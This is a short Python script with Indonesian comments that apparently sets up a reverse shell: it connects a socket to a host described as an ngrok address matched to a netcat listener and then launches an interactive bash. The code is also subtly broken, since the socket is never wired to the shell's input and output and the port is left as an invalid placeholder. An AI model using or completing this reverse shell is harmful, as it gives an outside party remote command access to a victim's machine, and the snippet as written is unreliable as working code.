import socket, subprocess

HOST = 'localhost' # atau alamat IP ngrok
PORT = <port> # port yang sama dengan ngrok dan netcat listener

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
subprocess.Popen(['/bin/bash', '-i'])
 
